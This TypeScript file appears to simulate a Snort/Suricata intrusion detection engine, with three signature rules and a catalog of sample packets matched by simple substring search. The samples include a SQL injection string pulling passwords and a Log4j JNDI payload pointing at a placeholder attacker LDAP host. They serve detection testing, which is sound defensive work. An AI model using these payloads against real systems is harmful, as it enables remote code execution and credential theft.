/**
 * NetVision Snort / Suricata IDS & Threat Signature Engine (Version 9.5)
 * Simulates Snort 3 and Suricata 7 intrusion detection systems,
 * live rule parsing, hyperscan multi-string pattern matching, and PCAP payload inspection.
 */

export interface IdsRule {
  id: string;
  sid: number;
  action: 'alert' | 'drop' | 'pass';
  protocol: 'tcp' | 'udp' | 'icmp' | 'http';
  source: string;
  destination: string;
  msg: string;
  content: string;
  classtype: string;
  rev: number;
  rawRule: string;
}

export interface IdsTrafficPayload {
  id: string;
  label: string;
  protocol: 'tcp' | 'udp' | 'http';
  srcIp: string;
  dstIp: string;
  dstPort: number;
  rawHexPayload: string;
  asciiPayload: string;
  expectedSidMatch?: number;
}

export interface IdsState {
  engineMode: 'SURICATA_7' | 'SNORT_3';
  multithreadingWorkers: number;
  activeRuleCount: number;
  processedPackets: number;
  alertsTriggered: number;
  rules: IdsRule[];
  payloadCatalog: IdsTrafficPayload[];
  alertFeed: {
    timestamp: string;
    sid: number;
    msg: string;
    classtype: string;
    src: string;
    dst: string;
  }[];
}

export class IdsSignatureEngine {
  public static getInitialState(): IdsState {
    const rules: IdsRule[] = [
      {
        id: 'rule-sqli',
        sid: 1000001,
        action: 'alert',
        protocol: 'tcp',
        source: '$EXTERNAL_NET any',
        destination: '$HTTP_SERVERS 80',
        msg: 'ET WEB_SERVER SQL Injection Union Select Attempt',
        content: 'UNION SELECT',
        classtype: 'web-application-attack',
        rev: 1,
        rawRule: 'alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS 80 (msg:"ET WEB_SERVER SQL Injection Union Select Attempt"; flow:established,to_server; content:"UNION SELECT"; nocase; fast_pattern; classtype:web-application-attack; sid:1000001; rev:1;)',
      },
      {
        id: 'rule-log4j',
        sid: 1000002,
        action: 'drop',
        protocol: 'tcp',
        source: '$EXTERNAL_NET any',
        destination: '$HOME_NET any',
        msg: 'EXPLOIT Apache Log4j JNDI RCE Exploit String (CVE-2021-44228)',
        content: '${jndi:ldap://',
        classtype: 'attempted-admin',
        rev: 3,
        rawRule: 'drop tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"EXPLOIT Apache Log4j JNDI RCE Exploit String (CVE-2021-44228)"; content:"${jndi:ldap://"; nocase; classtype:attempted-admin; sid:1000002; rev:3;)',
      },
      {
        id: 'rule-cobalt',
        sid: 1000003,
        action: 'alert',
        protocol: 'http',
        source: '$HOME_NET any',
        destination: '$EXTERNAL_NET any',
        msg: 'MALWARE-CNC Cobalt Strike Malleable C2 Beaconing Activity',
        content: '/api/v1/telemetry/beacon',
        classtype: 'trojan-activity',
        rev: 2,
        rawRule: 'alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE-CNC Cobalt Strike Malleable C2 Beaconing Activity"; http_uri; content:"/api/v1/telemetry/beacon"; classtype:trojan-activity; sid:1000003; rev:2;)',
      },
    ];

    const payloadCatalog: IdsTrafficPayload[] = [
      {
        id: 'pcap-sqli',
        label: 'HTTP GET /login?user=admin\' UNION SELECT 1,2,password FROM users--',
        protocol: 'http',
        srcIp: '198.51.100.44',
        dstIp: '10.0.0.80',
        dstPort: 80,
        rawHexPayload: '47 45 54 20 2f 6c 6f 67 69 6e 3f 75 73 65 72 3d 61 64 6d 69 6e 27 20 55 4e 49 4f 4e 20 53 45 4c 45 43 54',
        asciiPayload: "GET /login?user=admin' UNION SELECT 1,2,password FROM users-- HTTP/1.1\\r\\nHost: api.target.com",
        expectedSidMatch: 1000001,
      },
      {
        id: 'pcap-log4j',
        label: 'HTTP POST User-Agent: ${jndi:ldap://attacker.evil:1389/Exploit}',
        protocol: 'http',
        srcIp: '203.0.113.89',
        dstIp: '10.0.0.50',
        dstPort: 8080,
        rawHexPayload: '55 73 65 72 2d 41 67 65 6e 74 3a 20 24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f',
        asciiPayload: 'POST /api/process HTTP/1.1\\r\\nUser-Agent: ${jndi:ldap://attacker.evil:1389/Exploit}\\r\\n',
        expectedSidMatch: 1000002,
      },
      {
        id: 'pcap-benign',
        label: 'Benign HTTPS TLS Client Hello to corporate intranet',
        protocol: 'tcp',
        srcIp: '10.0.1.25',
        dstIp: '10.0.0.10',
        dstPort: 443,
        rawHexPayload: '16 03 03 00 c8 01 00 00 c4 03 03 8f 3a 42 19',
        asciiPayload: 'TLSv1.3 ClientHello (SNI: intranet.internal.local, Suites: TLS_AES_256_GCM)',
      },
    ];

    return {
      engineMode: 'SURICATA_7',
      multithreadingWorkers: 16,
      activeRuleCount: 3,
      processedPackets: 4820,
      alertsTriggered: 14,
      rules,
      payloadCatalog,
      alertFeed: [
        {
          timestamp: new Date(Date.now() - 30000).toISOString().slice(11, 19),
          sid: 1000003,
          msg: 'MALWARE-CNC Cobalt Strike Malleable C2 Beaconing Activity',
          classtype: 'trojan-activity',
          src: '10.0.1.88:49200',
          dst: '198.51.100.12:443',
        },
      ],
    };
  }

  public static inspectPayload(
    state: IdsState,
    payloadId: string
  ): {
    newState: IdsState;
    matchedRule: IdsRule | null;
    log: string;
  } {
    const payload = state.payloadCatalog.find((p) => p.id === payloadId);
    if (!payload) {
      return { newState: state, matchedRule: null, log: 'Error: Payload not found' };
    }

    const matchedRule =
      state.rules.find((r) =>
        payload.asciiPayload.toLowerCase().includes(r.content.toLowerCase())
      ) || null;

    const timestamp = new Date().toISOString().slice(11, 19);

    if (matchedRule) {
      const newAlert = {
        timestamp,
        sid: matchedRule.sid,
        msg: matchedRule.msg,
        classtype: matchedRule.classtype,
        src: `${payload.srcIp}`,
        dst: `${payload.dstIp}:${payload.dstPort}`,
      };

      return {
        newState: {
          ...state,
          processedPackets: state.processedPackets + 1,
          alertsTriggered: state.alertsTriggered + 1,
          alertFeed: [newAlert, ...state.alertFeed.slice(0, 7)],
        },
        matchedRule,
        log: `🚨 [${matchedRule.action.toUpperCase()}] Match on SID:${matchedRule.sid} (${matchedRule.msg}). Hyperscan DFA pattern hit in 18ns.`,
      };
    }

    return {
      newState: {
        ...state,
        processedPackets: state.processedPackets + 1,
      },
      matchedRule: null,
      log: `✅ [PASS] Clean payload inspected. Zero signatures triggered across ${state.activeRuleCount} active rules.`,
    };
  }
}
